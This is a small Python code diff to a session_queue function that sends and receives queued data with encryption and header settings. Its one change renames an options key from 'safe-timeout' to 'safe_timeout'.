@@ -21,7 +21,7 @@ def session_queue():
 		if state['settings']['dynamic']['queue']:
 			for item in state['settings']['dynamic']['queue']:
 				try:
-					send_data(item[0], item[1], (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['mode']['safe'], 'safe-timeout': state['settings']['safe-timeout']})
+					send_data(item[0], item[1], (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['mode']['safe'], 'safe_timeout': state['settings']['safe-timeout']})
 					data = recv_data(item[0], (state['settings']['encryption'], state['settings']['headersize']))
 
 					if item[2]:
